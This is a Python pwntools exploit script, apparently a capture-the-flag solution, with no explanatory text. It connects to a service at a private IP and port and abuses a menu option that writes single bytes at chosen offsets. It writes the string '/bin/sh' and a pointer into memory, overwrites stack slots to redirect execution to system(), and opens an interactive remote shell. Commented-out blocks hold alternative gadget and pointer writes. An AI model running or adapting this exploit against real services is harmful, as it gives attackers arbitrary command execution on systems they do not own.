#!/usr/bin/env python
from pwn import *
r=remote("10.112.108.77",2334)
r.recv()
r.sendline('1')
r.recv()
r.sendline('1')
r.recv()
##### write "/bin/sh"
##############################/bin/sh0x2f 62696e2f7368
r.sendline('3')
r.recv()
r.sendline('144')
r.recv()
r.sendline("47")
r.recv()
##############################/bin/sh--0x2f62 696e2f7368'
r.sendline('3')
r.recv()
r.sendline('145')
r.recv()
r.sendline('98')
r.recv()
##############################/bin/sh--0x2f6269 6e2f7368'
r.sendline('3')
r.recv()
r.sendline('146')
r.recv()
r.sendline('105')
r.recv()
##############################/bin/sh--0x2f62696e 2f7368'
r.sendline('3')
r.recv()
r.sendline('147')
r.recv()
r.sendline('110')
r.recv()
##############################/bin/sh--0x2f62696e2f 7368'
r.sendline('3')
r.recv()
r.sendline('148')
r.recv()
r.sendline('47')
r.recv()
##############################/bin/sh--0x2f62696e2f73 68'
r.sendline('3')
r.recv()
r.sendline('149')
r.recv()
r.sendline('115')
##############################/bin/sh--0x2f62696e2f7368'
r.sendline('3')
r.recv()
r.sendline('150')
r.recv()
r.sendline('104')
r.recv()


r.sendline('3')
r.recv()
r.sendline('151')
r.recv()
r.sendline('0')
r.recv()

r.sendline('3')
r.recv()
r.sendline('152')
r.recv()
r.sendline('0')
r.recv()

###### write ptr to /bin/bash ---> 0xf6fff0ec #####
r.sendline('3')
r.recv()
r.sendline('140')
r.recv()
r.sendline('232')
r.recv()

r.sendline('3')
r.recv()
r.sendline('141')
r.recv()
r.sendline('240')
r.recv()

r.sendline('3')
r.recv()
r.sendline('142')
r.recv()
r.sendline('255')
r.recv()

r.sendline('3')
r.recv()
r.sendline('143')
r.recv()
r.sendline('246')
r.recv()



#############call system##############
r.sendline('3')
r.recv()
r.sendline('132')
r.recv()
r.sendline('80')
r.recv()

r.sendline('3')
r.recv()
r.sendline('133')
r.recv()
r.sendline('132')
r.recv()

r.sendline('3')
r.recv()
r.sendline('134')
r.recv()
r.sendline('4')
r.recv()

r.sendline('3')
r.recv()
r.sendline('135')
r.recv()
r.sendline('8')
r.recv()

"""
#####################################0x080489 5b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('136')
r.recv()
r.sendline("91")
r.recv()
#####################################0x0804 895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('137')
r.recv()
r.sendline("137")
r.recv()
#####################################0x08 04895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('138')
r.recv()
r.sendline("4")
r.recv()
#####################################0x 0804895b pop ebp ret
r.sendline('3')
r.recv()
r.sendline('139')
r.recv()
r.sendline("8")
r.recv()
"""

"""
##############################0xf6fff0 e8
r.sendline('3')
r.recv()
r.sendline('144')
r.recv()
r.sendline("236")
r.recv()
##############################0xf6ff f0e8
r.sendline('3')
r.recv()
r.sendline('145')
r.recv()
r.sendline("240")
r.recv()
##############################0xf6 fff0e8
r.sendline('3')
r.recv()
r.sendline('146')
r.recv()
r.sendline("255")
r.recv()
##############################0x f6fff0e8
r.sendline('3')
r.recv()
r.sendline('147')
r.recv()
r.sendline("246")
r.recv()
"""
r.sendline('5')
r.interactive()